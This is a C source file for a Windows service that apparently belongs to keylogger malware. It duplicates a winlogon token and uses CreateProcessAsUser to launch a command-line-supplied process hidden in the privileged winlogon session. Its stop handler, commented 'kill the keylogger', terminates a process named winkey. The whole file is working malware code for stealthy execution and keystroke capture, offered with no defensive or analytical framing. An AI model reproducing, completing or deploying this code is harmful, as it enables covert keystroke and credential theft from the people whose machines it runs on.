#include "svc.h"

SERVICE_STATUS g_svc_status;
SERVICE_STATUS_HANDLE g_svc_status_handle;
HANDLE g_svc_stop_event = NULL;

VOID WINAPI svc_main(DWORD argc, LPTSTR *argv)
{
	// Exit if there's no command to run.
	if (argc <= 1)
		return;

	// Register the handler for control requests.
	g_svc_status_handle = RegisterServiceCtrlHandler(SVC_NAME, svc_ctrl_handler);
	if (!g_svc_status_handle)
		return;

	// Initialize basic status fields and report start pending.
	g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_svc_status.dwServiceSpecificExitCode = 0;
	report_svc_status(SERVICE_START_PENDING, NO_ERROR, 3000);

	// Create an event to signal when the service should stop.
	g_svc_stop_event = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!g_svc_stop_event)
	{
		report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	// Report that the service is now running.
	report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);

	// Impersonate the winlogon session to run the specified process.
	HANDLE dup_token = get_winlogon_duptoken();
	if (!dup_token)
	{
		report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	STARTUPINFO info = {sizeof(info)};
	PROCESS_INFORMATION proc_info = {0};

	// Create the target process in the winlogon context.
	if (!CreateProcessAsUser(dup_token, NULL, argv[1], NULL, NULL, FALSE,
							 CREATE_NO_WINDOW, NULL, NULL, &info, &proc_info))
	{
		return;
	}
	CloseHandle(dup_token);

	// Wait for the created process to exit, then clean up.
	WaitForSingleObject(proc_info.hProcess, INFINITE);
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	CloseHandle(g_svc_stop_event);

	// Report that the service has stopped.
	report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
}

VOID report_svc_status(DWORD current_state, DWORD win32_exit_code, DWORD wait_hint)
{
	static DWORD checkpoint = 1;

	g_svc_status.dwCurrentState = current_state;
	g_svc_status.dwWin32ExitCode = win32_exit_code;
	g_svc_status.dwWaitHint = wait_hint;

	if (current_state == SERVICE_START_PENDING)
	{
		g_svc_status.dwControlsAccepted = 0;
	}
	else
	{
		g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}

	if (current_state == SERVICE_RUNNING || current_state == SERVICE_STOPPED)
	{
		g_svc_status.dwCheckPoint = 0;
	}
	else
	{
		g_svc_status.dwCheckPoint = checkpoint++;
	}

	SetServiceStatus(g_svc_status_handle, &g_svc_status);
}

VOID WINAPI svc_ctrl_handler(DWORD ctrl)
{
	switch (ctrl)
	{
	case SERVICE_CONTROL_STOP:
		// Indicate we're stopping, kill the keylogger, and set the stop event.
		report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);
		kill_winkey_process();
		SetEvent(g_svc_stop_event);
		report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
		break;

	case SERVICE_CONTROL_INTERROGATE:
		// Do nothing special; the SCM just wants current status.
		break;

	default:
		break;
	}
}
